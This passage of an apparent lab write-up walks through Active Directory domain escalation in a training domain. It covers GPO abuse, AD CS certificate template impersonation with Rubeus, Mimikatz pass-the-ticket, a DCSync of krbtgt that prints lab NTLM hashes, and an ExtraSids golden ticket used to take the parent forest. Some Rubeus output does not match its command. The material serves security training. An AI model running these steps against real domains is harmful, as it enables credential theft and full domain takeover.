We can now navigate to the GPO that our user has permission to modify (Servers > Management Servers> Management Server Pushes).

![img](/img/ExploitingAD/6.png)

We can right-click on the GPO and select Edit. This will open the new Group Policy Management Editor window.

![img](/img/ExploitingAD/7.png)

In order to add our account to the local groups, we need to perform the following steps:

 1. Expand **Computer Configuration**
 2. Expand **Policies**
 3. Expand **Windows Settings**
 4. Expand **Security Settings**
 5. Right Click on **Restricted Groups** and select **Add Group**
 6. Click **Browse**, enter **IT Support** and  click **Check Names**
 7. Click **Okay** twice

![img](/img/ExploitingAD/8.png)

The first filter is not used. For the second filter, we want to add both the Administrators and Remote Desktop Users groups. In the end, it should look something like this:

![img](/img/ExploitingAD/9.png)

Once the configuration has been made, we can click **Apply** and **OK**. Now, all we need to do is wait for a maximum of 15 minutes for the GPO to be applied. After this, our initial account that we made a member of the **IT Support** group will now have administrative and RDP permissions on THMSERVER2!

## 6. Exploiting Certificates

Now that we have access to THMSERVER2, we have furthered our journey of exploiting AD by exploiting all Tier 1 assets (servers). However, we are again stuck without the simple means to move to the next tier. So again, we will need to look for more creative paths.

Research done and released as a [whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by SpecterOps showed that it was possible to exploit misconfigured certificate templates for privilege escalation and lateral movement.

### 6.1 **Context**

**AD Certificate Services:**
Active Directory Certificate Services (AD CS) is Microsoft’s implementation of a Public Key Infrastructure (PKI). Because Active Directory establishes trust within an organization, AD CS can function as a Certificate Authority (CA) to issue and manage digital certificates that establish and delegate trust. These certificates are used for purposes such as file system encryption, digital signatures, and user authentication, which makes AD CS an attractive target for attackers.

Since AD CS is a highly privileged service, it typically runs on selected domain controllers. As a result, standard users cannot directly interact with it. However, in large organizations, it is impractical for administrators to manually issue certificates to every user. To solve this, AD CS uses certificate templates. These templates define who can request certificates and under what conditions. SpecterOps discovered that certain dangerous combinations of template settings can be exploited for privilege escalation and long-term persistence within a domain.

Before diving deeper into certificate abuse, here are some key terms:

* **PKI (Public Key Infrastructure):** A system for managing digital certificates and public key encryption.
* **AD CS (Active Directory Certificate Services):** Microsoft’s PKI implementation, typically running on domain controllers.
* **CA (Certificate Authority):** A trusted entity that issues and signs digital certificates.
* **Certificate Template:** A predefined set of rules that controls how and when a certificate can be issued.
* **CSR (Certificate Signing Request):** A request sent to a CA to obtain a signed certificate.
* **EKU (Extended/Enhanced Key Usage):** Object identifiers that define what a certificate is allowed to be used for.

### 6.2 **Finding Vulnerable Certificate Templates**

In order to find vulnerable templates, we will use Window's built-in tool certutil. Using our RDP access on THMSERVER2, we can run the following Powershell script to enumerate certificates:

```powershell
C:\>certutil -Template -v > templates.txt
```

This process will display all configured certificate templates. While automated tools like Ghostpack’s **PSPKIAudit** can also be used for this purpose, a manual review ensures that no potential misconfigurations are overlooked. A certificate template is considered vulnerable when a dangerous combination of parameter values allows a requester to escalate privileges.

In this scenario, we are specifically looking for a template that contains the following toxic configuration:

* **Client Authentication** enabled – The certificate can be used for client authentication.
* **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** enabled – The requester can specify the Subject Alternative Name (SAN).
* **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY** enabled – The private key is exportable.
* **Certificate Permissions** correctly assigned – We have sufficient permissions to enroll in the template.

For deeper insight into these dangerous parameter combinations, the SpecterOps whitepaper is the definitive reference. Since the objective here is to build a broad understanding of AD exploitation techniques, we will directly highlight **Template[32]** as the vulnerable one. This template allows the **THMSERVER2** machine account to submit a CSR for a certificate that supports client authentication and permits custom SAN specification.

SpecterOps identifies eight common AD CS security misconfigurations, but this should not be taken as a complete list. In practice, many more exploitable misconfigurations can exist in real-world environments.

### 6.3 **Exploiting a Certificate Template**

With RDP access to **THMSERVER2**, we can now proceed to request the certificate. If you are using **Remmina** and have saved your RDP connection profile, ensure that **Restricted Admin Mode is disabled**, as it will interfere with certificate enrollment.

We will use the **Microsoft Management Console (MMC)** to request the certificate:

1. Open the **Start** menu and select **Run**.
2. Type `mmc` and press **Enter**.
3. In the MMC window, click **File → Add/Remove Snap-in**.
4. Add the **Certificates** snap-in.
5. When prompted, select **Computer Account**, then choose **Local Computer**.
6. Click **OK** to load the snap-in.

You should now see the **Certificates** snap-in loaded within MMC.

![img](/img/ExploitingAD/10.png)

We will request a personal certificate:

1. Right Click on **Personal** and select **All Tasks->Request New Certificate...**
2. Click **Next** twice to select the AD enrollment policy.
3. You will see that we have one template that we can request, but first, we need to provide additional information.
4. Click on the **More Information** warning.
5. Change the **Subject name Type** option to **Common Name** and provide any value, since it does not matter, and click **Add**.
6. Change the **Alternative name Type** option to **User principal name**.
7. Supply the UPN of the user you want to impersonate. The best would be a DA account such as `Administrator@za.tryhackme.loc` and click **Add**.

Your additional information should look something like this:

![img](/img/ExploitingAD/11.png)

Once you are happy with it, click **Apply** and **OK**. Then, select the certificate and click **Enroll**. You should be able to see your certificate:

![img](/img/ExploitingAD/12.png)

The last step is to export our certificate with the private key:

1. Right-click on the certificate and select **All Tasks->Export...**
2. Click **Next**, select **Yes, export the private key**, and click **Next.**
3. Click **Next**, then set a password for the certificate since the private key cannot be exported without a password.
4. Click **Next** and select a location to store the certificate.
5. Click **Next** and finally click **Finish**.

### 6.4 **User Impersonation through a Certificate**

Now we can finally impersonate a user. To perform this, two steps are required:

* Use the certificate to request a Kerberos ticket-granting ticket (TGT)
* Load the Kerberos TGT into your hacking platform of choice

For the first step, we will be using [Rubeus](https://github.com/GhostPack/Rubeus).

```powershell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

**Once we execute the command, we should receive our TGT:**

```cmd
C:\THMTools> .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             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
       
         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             : ZA.TRYHACKME.LOC
         UserName                 : Adminsitrator
         UserRealm                : ZA.TRYHACKME.LOC
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```

**Now we can use Mimikatz to load the TGT and authenticate to THMDC:**

```cmd
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt administrator.kirbi

* File: 'administrator.kirbi': OK

mimikatz # exit
Bye!

C:\Tools>dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,914,541,568 bytes free
```

## 7. Exploiting Domain Trusts

Tier 0 access alone isn’t enough, we currently control only `ZA.TRYHACKME.LOC`. Since TRYHACKME likely maintains multiple regional domains, the real prize is the root domain: TRYHACKME.LOC. Once that falls, every trusted domain in the forest becomes vulnerable. This task demonstrates how exploiting domain trust enables total forest domination.

### 7.1 **Context:**

**Domain Trusts:**
a forest is a collection of one or more domain trees inside an AD network. Domain Trusts are a mechanism for users in the network to gain access to other resources in the domain. For the most part, trusts outline how the domains inside of a forest communicate with each other. In some environments, trusts can be extended out to external domains and even forests in some cases.

There are two main types of trusts that can be configured between domains:

* Directional - The direction of the trust flows from a trusting domain to a trusted domain
* Transitive - The trust relationship expands beyond just two domains to include other trusted domains

It is common to have a root or parent domain in a forest. In our case, this is TRYHACKME.LOC. For each regional office, sub or child domains are created, such as ZA.TRYHACKME.LOC or UK.TRYHACKME.LOC. This forest configuration will allow the sharing of resources between the ZA and the UK office. For example, if some user in the UK office requires access to THMSERVER1, we can grant access for the user in the ZA domain. This permission delegation works since there is bidirectional trust between ZA and the root domain and the UK and the root domain, essentially creating a transitive trust between ZA and UK.

As mentioned above, the trust between a parent and child domain is bidirectional. This is intended behaviour and is used to share resources through greater transitive trust relationships. However, as an attacker, we can also exploit this trust to compromise the parent domain if we have compromised a child domain.

**KRBTGT and Golden Tickets:**

KRBTGT is the account used for Microsoft's implementation of Kerberos. The name is derived from Kerberos (KRB) and Ticket Granting Ticket (TGT). Essentially, this account acts as the service account for the Kerberos Distribution Center (KDC) service, which handles all Kerberos ticket requests. This account is used to encrypt and sign all Kerberos tickets for the domain. Since the password hash is shared by all domain controllers, they can then verify the authenticity of the received TGT when users request access to resources.

However, what if we want to generate our own TGTs to grant us access to everything? This is known as a Golden Ticket attack. In a Golden Ticket attack, we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket Granting Server (TGS). In order to forge TGTs, we need the following information:

* The FQDN of the domain
* The Security Identifier (SID) of the domain
* The username of the account we want to impersonate
* The KRBTGT password hash

The first three are usually easy to recover. The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. Luckily for us, we have just compromised the Tier 0 admins group with a forged certificate, so we are in a position to recover the KRBTGT password hash.

We will again use Mimikatz with a DC Sync to recover the KRBTGT password hash on THMSERVER2:

```cmd
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:za\krbtgt
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'za\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/25/2022 7:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: removed
  ntlm- 0: removed
  lm  - 0: removed
  [...]
  [...]
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:aeda8b62fd15a38022aaeffd6757c677 :::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 :::
  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16f9af38fca3ada405386b3b57366082 :::
  vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae :::
[....]
```

**Inter-Realm TGTs:**
Using the KRBTGT password hash, we could now forge a Golden Ticket to access any resource in the child domain. However, we can take this a step further by forging an Inter-Realm TGT. Inter-Realm TGTs are used to provide access to resources in other domains. In our case, we want to exploit the bidirectional trust relationship between the child and parent domain to gain full access to the parent domain.

To execute this attack, we will embed additional account SIDs from external domains when crafting our Golden Ticket. Mimikatz makes this possible by allowing us to populate the **ExtraSids** field within the `KERB_VALIDATION_INFO` structure of the Kerberos TGT.

The **ExtraSids** field is defined as follows:
A pointer to a list of `KERB_SID_AND_ATTRIBUTES` structures containing SIDs for groups that exist in domains other than the principal’s home domain.

The attack hinges on abusing the trust relationship between the child and parent domains. By injecting the SID of the **Enterprise Admins (EA)** group as an Extra SID into a forged TGT for the **child domain controller**, we effectively inherit forest-wide administrative privileges.

The Enterprise Admins group resides in the **parent domain**, and membership grants full administrative control over the entire forest. Its default SID format is `S-1-5-21-<RootDomain>-519`

Before proceeding with exploitation, we must extract two critical SIDs:

1. The SID of the **child domain controller (THMDC)**, which we will impersonate in the forged TGT.
2. The SID of the **Enterprise Admins group** in the parent domain, which will be added as the Extra SID.

These SIDs can be retrieved using the **AD-RSAT PowerShell cmdlets**.

The SID of the child domain controller can be obtained with the following command:

```powershell
PS C:\> Get-ADComputer -Identity "THMDC"

DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DNSHostName       : THMDC.za.tryhackme.loc
Enabled           : True
Name              : THMDC
ObjectClass       : computer
ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b
SamAccountName    : THMDC$
SID               : S-1-5-21-3885271727-2693558621-2658995185-1001
UserPrincipalName :
```

We can recover the SID of the Enterprise Admins group using the following command to query the parent domain controller:

```powershell
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-removed-519
```

### 7.2 **Exploitation of Domain Trusts**

We finally have all of the information required to create our forged TGT. We will use Mimikatz to generate this golden ticket. The command will look something like this:

```cmd
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
User      : Administrator
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185-1001
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 4/30/2022 7:52:51 PM ; 4/27/2032 7:52:51 PM ; 4/27/2032 7:52:51 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session
```

First, we will verify that this ticket works for access to THMDC since it is a valid ticket for the Administrator user of the child domain:

```cmd
C:\>dir \\thmdc.za.tryhackme.loc\c$
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\thmdc.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,913,189,888 bytes free;
```

This at least confirms that the Golden Ticket was forged for access to the child DC. However, since we specified extra SIDs, we should also now have access to the parent DC:

```cmd
C:\>dir \\thmrootdc.tryhackme.loc\c$\
 Volume in drive \\thmrootdc.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\thmrootdc.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:25 PM    <DIR>          Program Files (x86)
04/23/2022  09:21 AM                58 root_dns_entries.csv
04/23/2022  09:22 AM             1,432 thm-network-setup-dc.ps1
04/25/2022  05:50 PM    <DIR>          tmp
04/27/2022  07:54 AM    <DIR>          Users
04/25/2022  05:50 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  06:29 PM    <DIR>          Windows
               3 File(s)          1,593 bytes
               7 Dir(s)  51,105,730,560 bytes free
```

This proves that we now have fully compromised the parent domain solely by compromising one of the child domains!

---

## *EOF*
